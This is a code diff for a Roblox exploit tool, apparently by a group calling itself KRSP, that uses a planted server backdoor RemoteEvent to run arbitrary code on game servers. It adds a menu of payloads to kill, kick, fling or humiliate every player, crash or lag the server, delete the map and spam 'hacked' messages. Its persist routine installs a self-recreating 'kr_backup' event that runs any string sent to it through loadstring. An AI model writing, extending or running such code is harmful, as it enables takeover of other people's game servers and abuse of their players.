+		TweenService:Create(persistBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 30, 10)}):Play()
+	else
+		TweenService:Create(persistBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(10, 50, 10)}):Play()
+	end
+end)
+persistBtn.MouseLeave:Connect(function()
+	if not persisted then
+		TweenService:Create(persistBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20, 20, 20)}):Play()
+	else
+		TweenService:Create(persistBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(10, 35, 10)}):Play()
+	end
+end)
+
+local consoleScroll = Instance.new("ScrollingFrame", pages.Console)
+consoleScroll.Size = UDim2.new(1, 0, 1, -40)
+consoleScroll.Position = UDim2.new(0, 0, 0, 0)
+consoleScroll.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+consoleScroll.BorderSizePixel = 0
+consoleScroll.ScrollBarThickness = 3
+consoleScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 60)
+consoleScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+round(consoleScroll, 8)
+Instance.new("UIStroke", consoleScroll).Color = Color3.fromRGB(40, 0, 0)
+
+local consoleLayout = Instance.new("UIListLayout", consoleScroll)
+consoleLayout.Padding = UDim.new(0, 2)
+consoleLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local consolePad = Instance.new("UIPadding", consoleScroll)
+consolePad.PaddingLeft = UDim.new(0, 8)
+consolePad.PaddingTop = UDim.new(0, 5)
+consolePad.PaddingRight = UDim.new(0, 8)
+
+local logOrder = 0
+
+local function addLog(text, logType)
+	logOrder = logOrder + 1
+	local logColors = {
+		success = Color3.fromRGB(0, 200, 0),
+		error = Color3.fromRGB(255, 60, 60),
+		info = Color3.fromRGB(120, 160, 255),
+		warn = Color3.fromRGB(255, 200, 0),
+		system = Color3.fromRGB(150, 150, 150),
+	}
+	local logPrefixes = {
+		success = "[OK]",
+		error = "[ERR]",
+		info = "[INFO]",
+		warn = "[WARN]",
+		system = "[SYS]",
+	}
+	local col = logColors[logType] or logColors.info
+	local prefix = logPrefixes[logType] or "[LOG]"
+	local timestamp = os.date("%H:%M:%S")
+
+	local line = Instance.new("TextLabel", consoleScroll)
+	line.Size = UDim2.new(1, 0, 0, 18)
+	line.BackgroundTransparency = 1
+	line.RichText = true
+	line.Text = string.format(
+		'<font color="rgb(80,80,80)">%s</font> <font color="rgb(%d,%d,%d)">%s</font> %s',
+		timestamp,
+		math.floor(col.R * 255), math.floor(col.G * 255), math.floor(col.B * 255),
+		prefix, text
+	)
+	line.TextColor3 = Color3.fromRGB(180, 180, 180)
+	line.Font = Enum.Font.Code
+	line.TextSize = 10
+	line.TextXAlignment = Enum.TextXAlignment.Left
+	line.LayoutOrder = logOrder
+	task.defer(function()
+		consoleScroll.CanvasPosition = Vector2.new(0, consoleScroll.AbsoluteCanvasSize.Y)
+	end)
+end
+
+local clearConsoleBtn = Instance.new("TextButton", pages.Console)
+clearConsoleBtn.Size = UDim2.new(0.3, 0, 0, 30)
+clearConsoleBtn.Position = UDim2.new(0.7, 0, 1, -35)
+clearConsoleBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+clearConsoleBtn.Text = "CLEAR LOG"
+clearConsoleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+clearConsoleBtn.Font = Enum.Font.GothamBold
+clearConsoleBtn.TextSize = 10
+round(clearConsoleBtn, 6)
+addButtonEffects(clearConsoleBtn, Color3.fromRGB(60, 0, 0), Color3.fromRGB(100, 0, 0))
+
+clearConsoleBtn.MouseButton1Click:Connect(function()
+	for _, child in pairs(consoleScroll:GetChildren()) do
+		if child:IsA("TextLabel") then child:Destroy() end
+	end
+	logOrder = 0
+	addLog("Console cleared", "system")
+end)
+
+local consoleCountLabel = Instance.new("TextLabel", pages.Console)
+consoleCountLabel.Size = UDim2.new(0.65, 0, 0, 30)
+consoleCountLabel.Position = UDim2.new(0, 5, 1, -35)
+consoleCountLabel.BackgroundTransparency = 1
+consoleCountLabel.Text = "Console Output"
+consoleCountLabel.TextColor3 = Color3.fromRGB(80, 80, 80)
+consoleCountLabel.Font = Enum.Font.Gotham
+consoleCountLabel.TextSize = 10
+consoleCountLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local searchBar = Instance.new("TextBox", pages.Scripts)
+searchBar.Size = UDim2.new(0.92, 0, 0, 30)
+searchBar.Position = UDim2.new(0.04, 0, 0, 5)
+searchBar.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+searchBar.PlaceholderText = "Search scripts..."
+searchBar.PlaceholderColor3 = Color3.fromRGB(70, 70, 70)
+searchBar.Text = ""
+searchBar.TextColor3 = Color3.fromRGB(220, 220, 220)
+searchBar.Font = Enum.Font.Gotham
+searchBar.TextSize = 12
+searchBar.ClearTextOnFocus = false
+searchBar.TextXAlignment = Enum.TextXAlignment.Left
+round(searchBar, 8)
+Instance.new("UIPadding", searchBar).PaddingLeft = UDim.new(0, 10)
+Instance.new("UIStroke", searchBar).Color = Color3.fromRGB(50, 0, 0)
+
+local catFrame = Instance.new("Frame", pages.Scripts)
+catFrame.Size = UDim2.new(0.92, 0, 0, 24)
+catFrame.Position = UDim2.new(0.04, 0, 0, 38)
+catFrame.BackgroundTransparency = 1
+
+local catLayout = Instance.new("UIListLayout", catFrame)
+catLayout.FillDirection = Enum.FillDirection.Horizontal
+catLayout.Padding = UDim.new(0, 6)
+
+local categories = {"ALL", "TROLL", "SERVER", "VISUAL", "CHAOS", "PROTECT"}
+local catButtons = {}
+local activeCategory = "ALL"
+
+for _, cat in ipairs(categories) do
+	local cb = Instance.new("TextButton", catFrame)
+	cb.Size = UDim2.new(0, 52, 0, 22)
+	cb.BackgroundColor3 = cat == "ALL" and Color3.fromRGB(100, 10, 10) or Color3.fromRGB(30, 30, 30)
+	cb.Text = cat
+	cb.TextColor3 = cat == "ALL" and Color3.new(1,1,1) or Color3.fromRGB(120, 120, 120)
+	cb.Font = Enum.Font.GothamBold
+	cb.TextSize = 9
+	round(cb, 6)
+	catButtons[cat] = cb
+end
+
+local scriptsScroll = Instance.new("ScrollingFrame", pages.Scripts)
+scriptsScroll.Size = UDim2.new(1, 0, 1, -70)
+scriptsScroll.Position = UDim2.new(0, 0, 0, 66)
+scriptsScroll.BackgroundTransparency = 1
+scriptsScroll.BorderSizePixel = 0
+scriptsScroll.ScrollBarThickness = 3
+scriptsScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 60)
+
+local sList = Instance.new("UIListLayout", scriptsScroll)
+sList.Padding = UDim.new(0, 6)
+sList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local statusBar = Instance.new("Frame", mainFrame)
+statusBar.Size = UDim2.new(1, 0, 0, 22)
+statusBar.Position = UDim2.new(0, 0, 1, -22)
+statusBar.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+statusBar.BackgroundTransparency = 0.2
+statusBar.BorderSizePixel = 0
+round(statusBar, 10)
+
+local statusDot = Instance.new("Frame", statusBar)
+statusDot.Size = UDim2.new(0, 8, 0, 8)
+statusDot.Position = UDim2.new(0, 10, 0.5, -4)
+statusDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+statusDot.BorderSizePixel = 0
+round(statusDot, 4)
+
+local statusText = Instance.new("TextLabel", statusBar)
+statusText.Size = UDim2.new(0.35, 0, 1, 0)
+statusText.Position = UDim2.new(0, 24, 0, 0)
+statusText.Text = "Connecting..."
+statusText.TextColor3 = Color3.fromRGB(120, 120, 120)
+statusText.Font = Enum.Font.Gotham
+statusText.TextSize = 10
+statusText.TextXAlignment = Enum.TextXAlignment.Left
+statusText.BackgroundTransparency = 1
+
+local fpsLabel = Instance.new("TextLabel", statusBar)
+fpsLabel.Size = UDim2.new(0, 50, 1, 0)
+fpsLabel.Position = UDim2.new(0.42, 0, 0, 0)
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.Text = "0 FPS"
+fpsLabel.TextColor3 = Color3.fromRGB(80, 80, 80)
+fpsLabel.Font = Enum.Font.Code
+fpsLabel.TextSize = 9
+
+local uptimeLabel = Instance.new("TextLabel", statusBar)
+uptimeLabel.Size = UDim2.new(0, 60, 1, 0)
+uptimeLabel.Position = UDim2.new(0.52, 0, 0, 0)
+uptimeLabel.BackgroundTransparency = 1
+uptimeLabel.Text = "00:00"
+uptimeLabel.TextColor3 = Color3.fromRGB(80, 80, 80)
+uptimeLabel.Font = Enum.Font.Code
+uptimeLabel.TextSize = 9
+
+local playerInfo = Instance.new("TextLabel", statusBar)
+playerInfo.Size = UDim2.new(0.3, 0, 1, 0)
+playerInfo.Position = UDim2.new(0.7, 0, 0, 0)
+playerInfo.Text = Players.LocalPlayer.Name
+playerInfo.TextColor3 = Color3.fromRGB(100, 100, 100)
+playerInfo.Font = Enum.Font.Gotham
+playerInfo.TextSize = 10
+playerInfo.TextXAlignment = Enum.TextXAlignment.Right
+playerInfo.BackgroundTransparency = 1
+Instance.new("UIPadding", playerInfo).PaddingRight = UDim.new(0, 10)
+
+local lastFpsUpdate = tick()
+local frameCount = 0
+local startTime = tick()
+RunService.RenderStepped:Connect(function()
+	frameCount = frameCount + 1
+	if tick() - lastFpsUpdate >= 1 then
+		local fps = frameCount
+		fpsLabel.Text = fps .. " FPS"
+		if fps >= 50 then
+			fpsLabel.TextColor3 = Color3.fromRGB(0, 180, 0)
+		elseif fps >= 30 then
+			fpsLabel.TextColor3 = Color3.fromRGB(200, 200, 0)
+		else
+			fpsLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+		end
+		local elapsed = math.floor(tick() - startTime)
+		local mins = math.floor(elapsed / 60)
+		local secs = elapsed % 60
+		uptimeLabel.Text = string.format("%02d:%02d", mins, secs)
+		frameCount = 0
+		lastFpsUpdate = tick()
+	end
+end)
+
 local library = {
-    {n = "SS MEGA LOADER", c = 'require(123255432303221):Pload("'..Players.LocalPlayer.Name..'")'},
-    {n = "NAKED ALL", c = "for _,v in pairs(game.Players:GetPlayers()) do if v.Character then for _,c in pairs(v.Character:GetChildren()) do if c:IsA('Clothing') or c:IsA('Accessory') or c:IsA('ShirtGraphic') then c:Destroy() end end end end"},
-    {n = "HEADLESS ALL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() v.Character.Head.Transparency = 1; v.Character.Head.face:Destroy() end) end"},
-    {n = "NOOBIFY ALL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() local bc = v.Character['Body Colors']; bc.HeadColor3 = Color3.new(1,1,0); bc.LeftArmColor3 = Color3.new(1,1,0); bc.RightArmColor3 = Color3.new(1,1,0); bc.TorsoColor3 = Color3.new(0,0,1); bc.LeftLegColor3 = Color3.new(0,1,0); bc.RightLegColor3 = Color3.new(0,1,0) end) end"},
-    {n = "FREEZE ALL", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then v.Character.HumanoidRootPart.Anchored = true end end"},
-    {n = "JAIL ALL", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then local cf = v.Character.HumanoidRootPart.CFrame; for i=1,4 do local p = Instance.new('Part', workspace); p.Size = Vector3.new(10,15,1); p.Anchored = true; p.CFrame = cf * CFrame.Angles(0, math.rad(i*90), 0) * CFrame.new(0,0,5) end end end"},
-    {n = "SPAM KRSP TEAM", c = "while true do local h = Instance.new('Hint', workspace); h.Text = 'SERVER HACKED BY KRSP TEAM'; task.wait(0.5); h:Destroy() end"},
-    {n = "RAINBOW DISCO", c = "spawn(function() while wait() do local c = Color3.fromHSV(tick() % 5 / 5, 1, 1); game.Lighting.FogColor = c; game.Lighting.Ambient = c; game.Lighting.FogEnd = 200; task.wait() end end)"},
-    {n = "BLACK HOLE", c = "local p = Instance.new('Part', workspace); p.Anchored = true; p.CanCollide = false; p.Size = Vector3.new(15,15,15); p.Color = Color3.new(0,0,0); while wait() do for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') and not v.Anchored then v.CFrame = p.CFrame end end end"},
-    {n = "TOTAL DARKNESS", c = "game.Lighting.TimeOfDay = '00:00:00'; game.Lighting.Brightness = 0"},
-    {n = "NUKE SERVER", c = "for _,v in pairs(game.Players:GetPlayers()) do Instance.new('Explosion', v.Character.PrimaryPart).Position = v.Character.PrimaryPart.Position end"},
-    {n = "KILL OTHERS", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then v.Character:BreakJoints() end end"}
+	{n = "SS MEGA LOADER", cat = "SERVER", c = 'require(123255432303221):Pload("'..Players.LocalPlayer.Name..'")'},
+	{n = "NAKED ALL", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do if v.Character then for _,c in pairs(v.Character:GetChildren()) do if c:IsA('Clothing') or c:IsA('Accessory') or c:IsA('ShirtGraphic') then c:Destroy() end end end end"},
+	{n = "HEADLESS ALL", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() v.Character.Head.Transparency = 1; v.Character.Head.face:Destroy() end) end"},
+	{n = "NOOBIFY ALL", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() local bc = v.Character['Body Colors']; bc.HeadColor3 = Color3.new(1,1,0); bc.LeftArmColor3 = Color3.new(1,1,0); bc.RightArmColor3 = Color3.new(1,1,0); bc.TorsoColor3 = Color3.new(0,0,1); bc.LeftLegColor3 = Color3.new(0,1,0); bc.RightLegColor3 = Color3.new(0,1,0) end) end"},
+	{n = "FREEZE ALL", cat = "SERVER", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then v.Character.HumanoidRootPart.Anchored = true end end"},
+	{n = "JAIL ALL", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then local cf = v.Character.HumanoidRootPart.CFrame; for i=1,4 do local p = Instance.new('Part', workspace); p.Size = Vector3.new(10,15,1); p.Anchored = true; p.CFrame = cf * CFrame.Angles(0, math.rad(i*90), 0) * CFrame.new(0,0,5) end end end"},
+	{n = "SPAM KRSP TEAM", cat = "TROLL", c = "while true do local h = Instance.new('Hint', workspace); h.Text = 'SERVER HACKED BY KRSP TEAM'; task.wait(0.5); h:Destroy() end"},
+	{n = "RAINBOW DISCO", cat = "VISUAL", c = "spawn(function() while wait() do local c = Color3.fromHSV(tick() % 5 / 5, 1, 1); game.Lighting.FogColor = c; game.Lighting.Ambient = c; game.Lighting.FogEnd = 200; task.wait() end end)"},
+	{n = "BLACK HOLE", cat = "SERVER", c = "local p = Instance.new('Part', workspace); p.Anchored = true; p.CanCollide = false; p.Size = Vector3.new(15,15,15); p.Color = Color3.new(0,0,0); while wait() do for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') and not v.Anchored then v.CFrame = p.CFrame end end end"},
+	{n = "TOTAL DARKNESS", cat = "VISUAL", c = "game.Lighting.TimeOfDay = '00:00:00'; game.Lighting.Brightness = 0"},
+	{n = "NUKE SERVER", cat = "SERVER", c = "for _,v in pairs(game.Players:GetPlayers()) do Instance.new('Explosion', v.Character.PrimaryPart).Position = v.Character.PrimaryPart.Position end"},
+	{n = "KILL OTHERS", cat = "SERVER", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then v.Character:BreakJoints() end end"},
+	{n = "ANTI-KICK", cat = "PROTECT", c = "local mt = getrawmetatable(game); local old = mt.__namecall; setreadonly(mt, false); mt.__namecall = newcclosure(function(self, ...) if getnamecallmethod() == 'Kick' then return end; return old(self, ...) end); setreadonly(mt, true)"},
+	{n = "ANTI-TP", cat = "PROTECT", c = "local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart; local pos = hrp.CFrame; spawn(function() while wait() do if (hrp.Position - pos.Position).Magnitude > 100 then hrp.CFrame = pos end; pos = hrp.CFrame end end)"},
+	{n = "GOD MODE", cat = "PROTECT", c = "local char = game.Players.LocalPlayer.Character; for _,v in pairs(char:GetDescendants()) do if v:IsA('Humanoid') then v.MaxHealth = math.huge; v.Health = math.huge end end"},
+	{n = "LOOP KILL ALL", cat = "CHAOS", c = "spawn(function() while wait(1) do for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then pcall(function() v.Character:BreakJoints() end) end end end end)"},
+	{n = "CRASH SERVER", cat = "CHAOS", c = "spawn(function() while true do for i=1,50 do Instance.new('Part', workspace).Size = Vector3.new(9e9,9e9,9e9) end; task.wait() end end)"},
+	{n = "LAG MACHINE", cat = "CHAOS", c = "spawn(function() while true do for i=1,200 do local p = Instance.new('Part', workspace); p.Anchored = false; p.Size = Vector3.new(1,1,1); p.Position = Vector3.new(math.random(-500,500), 100, math.random(-500,500)) end; task.wait(0.5) end end)"},
+	{n = "LOOP EXPLODE", cat = "CHAOS", c = "spawn(function() while wait(0.5) do for _,v in pairs(game.Players:GetPlayers()) do pcall(function() Instance.new('Explosion', workspace).Position = v.Character.PrimaryPart.Position end) end end end)"},
+	{n = "FLING ALL", cat = "CHAOS", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then pcall(function() v.Character.HumanoidRootPart.Velocity = Vector3.new(math.random(-9999,9999), 9999, math.random(-9999,9999)) end) end end"},
+	{n = "CHAT SPAM", cat = "TROLL", c = "spawn(function() while wait(0.3) do pcall(function() game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('SERVER HACKED BY KRSP TEAM', 'All') end) end end)"},
+	{n = "HINT SPAM", cat = "TROLL", c = "spawn(function() while true do for i=1,5 do local h = Instance.new('Hint', workspace); h.Text = 'KR_BACKDOOR WAS HERE | KRSP TEAM' end; task.wait(0.3); for _,v in pairs(workspace:GetChildren()) do if v:IsA('Hint') then v:Destroy() end end end end)"},
+	{n = "MSG POPUP", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() local m = Instance.new('Message', v.PlayerGui); m.Text = 'HACKED BY KRSP TEAM'; game.Debris:AddItem(m, 10) end) end"},
+	{n = "SEIZURE SKY", cat = "VISUAL", c = "spawn(function() while wait() do game.Lighting.TimeOfDay = tostring(math.random(0,24))..':'..tostring(math.random(0,59)); game.Lighting.Ambient = Color3.fromHSV(math.random(),1,1); game.Lighting.Brightness = math.random(0,10) end end)"},
+	{n = "INVISIBLE ALL", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() for _,p in pairs(v.Character:GetDescendants()) do if p:IsA('BasePart') or p:IsA('Decal') then p.Transparency = 1 end end end) end"},
+	{n = "GIANT ALL", cat = "TROLL", c = "for _,v in pairs(game.Players:GetPlayers()) do pcall(function() for _,p in pairs(v.Character:GetDescendants()) do if p:IsA('BasePart') then p.Size = p.Size * 5 end end end) end"},
+	{n = "RESET LIGHTING", cat = "VISUAL", c = "game.Lighting.TimeOfDay = '14:00:00'; game.Lighting.Brightness = 2; game.Lighting.Ambient = Color3.new(0.5,0.5,0.5); game.Lighting.FogEnd = 100000"},
+	{n = "REMOVE MAP", cat = "CHAOS", c = "for _,v in pairs(workspace:GetChildren()) do if not v:IsA('Camera') and not v:IsA('Terrain') and not game.Players:GetPlayerFromCharacter(v) then pcall(function() v:Destroy() end) end end"},
+	{n = "KICK OTHERS", cat = "SERVER", c = "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then pcall(function() v:Kick('Removed by KRSP Team') end) end end"},
 }
 
 local backdoor = nil
-local function execute(code) if backdoor then backdoor:FireServer(code) end end
+local scriptButtons = {}
+local persisted = false
 
-for _, data in pairs(library) do
-    local b = Instance.new("TextButton", pages.Scripts); b.Size = UDim2.new(0.9, 0, 0, 45); b.BackgroundColor3 = Color3.fromRGB(100, 0, 0); b.Text = data.n; b.TextColor3 = Color3.new(1,1,1); b.Font = "GothamBold"; round(b, 10); b.TextSize = 12
-    addButtonEffects(b, Color3.fromRGB(100, 0, 0), Color3.fromRGB(160, 0, 0))
-    b.MouseButton1Click:Connect(function() execute(data.c) end)
+local function findBackdoor()
+	for _, name in ipairs({"kr_backup", targetName}) do
+		local found = ReplicatedStorage:FindFirstChild(name)
+		if found and found:IsA("RemoteEvent") then
+			return found
+		end
+	end
+	for _, v in pairs(ReplicatedStorage:GetChildren()) do
+		if v:IsA("RemoteEvent") then
+			return v
+		end
+	end
+	return nil
 end
-pages.Scripts.CanvasSize = UDim2.new(0,0,0, #library * 55 + 20)
 
--- [[ SCANNER ]] --
+local function updateStatus()
+	if backdoor then
+		statusDot.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+		statusText.Text = "Connected: " .. backdoor.Name
+		statusText.TextColor3 = Color3.fromRGB(0, 180, 0)
+	else
+		statusDot.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+		statusText.Text = "Offline Mode"
+		statusText.TextColor3 = Color3.fromRGB(180, 0, 0)
+	end
+end
+
+local function execute(code)
+	if not backdoor or not backdoor.Parent then
+		backdoor = findBackdoor()
+		updateStatus()
+	end
+	if backdoor then
+		backdoor:FireServer(code)
+		addLog("Executed: " .. string.sub(code, 1, 60) .. (string.len(code) > 60 and "..." or ""), "success")
+		notify("Script executed", "success")
+	else
+		addLog("No backdoor found, cannot execute", "error")
+		notify("No backdoor connected", "error")
+	end
+end
+
+local function persistBackdoor()
+	if not backdoor then
+		notify("No backdoor to persist", "error")
+		return
+	end
+	if persisted then
+		notify("Already persisted", "warn")
+		return
+	end
+
+	local persistCode = [[
+if game.ReplicatedStorage:FindFirstChild("kr_backup") then return end
+local backup = Instance.new("RemoteEvent", game.ReplicatedStorage)
+backup.Name = "kr_backup"
+backup.OnServerEvent:Connect(function(player, SS)
+	pcall(function() loadstring(SS)() end)
+end)
+task.spawn(function()
+	while task.wait(3) do
+		if not game.ReplicatedStorage:FindFirstChild("kr_backup") then
+			local r = Instance.new("RemoteEvent", game.ReplicatedStorage)
+			r.Name = "kr_backup"
+			r.OnServerEvent:Connect(function(player, SS)
+				pcall(function() loadstring(SS)() end)
+			end)
+		end
+	end
+end)
+]]
+
+	backdoor:FireServer(persistCode)
+	addLog("Persist code deployed to server", "success")
+	notify("Backup backdoor deployed!", "success")
+
+	task.delay(3, function()
+		local backup = ReplicatedStorage:FindFirstChild("kr_backup")
+		if backup then
+			persisted = true
+			addLog("kr_backup confirmed on server", "success")
+			notify("Persist confirmed!", "success")
+			persistBtn.Text = "PERSISTED"
+			persistBtn.BackgroundColor3 = Color3.fromRGB(10, 35, 10)
+			persistStroke.Color = Color3.fromRGB(0, 120, 0)
+			persistBtn.TextColor3 = Color3.fromRGB(0, 220, 0)
+		else
+			addLog("kr_backup not found, persist may have failed", "warn")
+			notify("Persist unconfirmed", "warn")
+		end
+	end)
+end
+
+local function watchBackdoor()
+	if not backdoor then return end
+
+	backdoor.AncestryChanged:Connect(function(_, newParent)
+		if newParent == nil then
+			addLog("Backdoor destroyed! Rescanning...", "error")
+			notify("Backdoor lost! Reconnecting...", "error")
+			statusDot.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
+			statusText.Text = "Reconnecting..."
+			statusText.TextColor3 = Color3.fromRGB(255, 200, 0)
+
+			backdoor = nil
+
+			for i = 1, 15 do
+				task.wait(2)
+				backdoor = findBackdoor()
+				if backdoor then break end
+			end
+
+			if backdoor then
+				updateStatus()
+				addLog("Reconnected: " .. backdoor:GetFullName(), "success")
+				notify("Reconnected!", "success")
+				watchBackdoor()
+			else
+				updateStatus()
+				addLog("Failed to reconnect after 15 retries", "error")
+				notify("Connection lost permanently", "error")
+			end
+		end
+	end)
+end
+
+local catColors = {
+	TROLL = Color3.fromRGB(200, 0, 200),
+	SERVER = Color3.fromRGB(200, 0, 0),
+	VISUAL = Color3.fromRGB(0, 150, 200),
+	CHAOS = Color3.fromRGB(255, 60, 0),
+	PROTECT = Color3.fromRGB(0, 200, 100),
+}
+
+for i, data in ipairs(library) do
+	local b = Instance.new("TextButton", scriptsScroll)
+	b.Size = UDim2.new(0.92, 0, 0, 40)
+	b.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+	b.Text = ""
+	b.AutoButtonColor = false
+	b.Name = "script_" .. i
+	round(b, 8)
+
+	local accent = Instance.new("Frame", b)
+	accent.Size = UDim2.new(0, 3, 0.7, 0)
+	accent.Position = UDim2.new(0, 5, 0.15, 0)
+	accent.BackgroundColor3 = catColors[data.cat] or Color3.fromRGB(200, 0, 0)
+	accent.BorderSizePixel = 0
+	round(accent, 2)
+
+	local catTag = Instance.new("TextLabel", b)
+	catTag.Size = UDim2.new(0, 42, 0, 16)
+	catTag.Position = UDim2.new(0, 14, 0.5, -8)
+	catTag.BackgroundColor3 = catColors[data.cat] or Color3.fromRGB(100, 0, 0)
+	catTag.BackgroundTransparency = 0.6
+	catTag.Text = data.cat
+	catTag.TextColor3 = Color3.new(1, 1, 1)
+	catTag.Font = Enum.Font.GothamBold
+	catTag.TextSize = 7
+	round(catTag, 4)
+
+	local label = Instance.new("TextLabel", b)
+	label.Size = UDim2.new(1, -130, 1, 0)
+	label.Position = UDim2.new(0, 62, 0, 0)
+	label.Text = data.n
+	label.TextColor3 = Color3.fromRGB(220, 220, 220)
+	label.Font = Enum.Font.GothamBold
+	label.TextSize = 11
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.BackgroundTransparency = 1
+
+	local copyBtn = Instance.new("TextButton", b)
+	copyBtn.Size = UDim2.new(0, 30, 0, 26)
+	copyBtn.Position = UDim2.new(1, -70, 0.5, -13)
+	copyBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
+	copyBtn.Text = "Ed"
+	copyBtn.TextColor3 = Color3.fromRGB(150, 150, 255)
+	copyBtn.Font = Enum.Font.GothamBold
+	copyBtn.TextSize = 9
+	round(copyBtn, 6)
+
+	copyBtn.MouseButton1Click:Connect(function()
+		editor.Text = data.c
+		notify("Copied to editor: " .. data.n, "info")
+		addLog("Loaded to editor: " .. data.n, "info")
+	end)
+
+	local execBtn = Instance.new("TextButton", b)
+	execBtn.Size = UDim2.new(0, 30, 0, 26)
+	execBtn.Position = UDim2.new(1, -36, 0.5, -13)
+	execBtn.BackgroundColor3 = Color3.fromRGB(0, 60, 0)
+	execBtn.Text = ">>"
+	execBtn.TextColor3 = Color3.fromRGB(100, 255, 100)
+	execBtn.Font = Enum.Font.GothamBold
+	execBtn.TextSize = 10
+	round(execBtn, 6)
+
+	execBtn.MouseButton1Click:Connect(function()
+		execute(data.c)
+		addLog("Library: " .. data.n, "info")
+	end)
+
+	Instance.new("UIStroke", b).Color = Color3.fromRGB(50, 0, 0)
+
+	b.MouseEnter:Connect(function()
+		TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 8, 8)}):Play()
+	end)
+	b.MouseLeave:Connect(function()
+		TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(18, 18, 18)}):Play()
+	end)
+
+	table.insert(scriptButtons, {btn = b, name = data.n, cat = data.cat})
+end
+
+local function filterScripts()
+	local query = string.lower(searchBar.Text)
+	local visibleCount = 0
+	for _, item in ipairs(scriptButtons) do
+		local matchSearch = query == "" or string.find(string.lower(item.name), query, 1, true)
+		local matchCat = activeCategory == "ALL" or item.cat == activeCategory
+		if matchSearch and matchCat then
+			item.btn.Visible = true
+			visibleCount = visibleCount + 1
+		else
+			item.btn.Visible = false
+		end
+	end
+	scriptsScroll.CanvasSize = UDim2.new(0, 0, 0, visibleCount * 46 + 20)
+end
+
+for cat, cb in pairs(catButtons) do
+	cb.MouseButton1Click:Connect(function()
+		activeCategory = cat
+		for c, btn in pairs(catButtons) do
+			btn.BackgroundColor3 = c == cat and Color3.fromRGB(100, 10, 10) or Color3.fromRGB(30, 30, 30)
+			btn.TextColor3 = c == cat and Color3.new(1,1,1) or Color3.fromRGB(120, 120, 120)
+		end
+		filterScripts()
+	end)
+end
+
+searchBar:GetPropertyChangedSignal("Text"):Connect(filterScripts)
+filterScripts()
+
+local playersScroll = Instance.new("ScrollingFrame", pages.Players)
+playersScroll.Size = UDim2.new(1, 0, 1, -35)
+playersScroll.Position = UDim2.new(0, 0, 0, 30)
+playersScroll.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+playersScroll.BorderSizePixel = 0
+playersScroll.ScrollBarThickness = 3
+playersScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 60)
+round(playersScroll, 8)
+Instance.new("UIStroke", playersScroll).Color = Color3.fromRGB(40, 0, 0)
+
+local pLayout = Instance.new("UIListLayout", playersScroll)
+pLayout.Padding = UDim.new(0, 4)
+pLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local playersTitle = Instance.new("TextLabel", pages.Players)
+playersTitle.Size = UDim2.new(1, 0, 0, 25)
+playersTitle.BackgroundTransparency = 1
+playersTitle.Text = "Online Players"
+playersTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
+playersTitle.Font = Enum.Font.GothamBold
+playersTitle.TextSize = 13
+playersTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local function refreshPlayers()
+	for _, child in pairs(playersScroll:GetChildren()) do
+		if child:IsA("Frame") then child:Destroy() end
+	end
+	local count = 0
+	for _, player in pairs(Players:GetPlayers()) do
+		count = count + 1
+		local row = Instance.new("Frame", playersScroll)
+		row.Size = UDim2.new(0.95, 0, 0, 36)
+		row.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+		round(row, 6)
+
+		local isLocal = player == Players.LocalPlayer
+
+		local pDot = Instance.new("Frame", row)
+		pDot.Size = UDim2.new(0, 8, 0, 8)
+		pDot.Position = UDim2.new(0, 10, 0.5, -4)
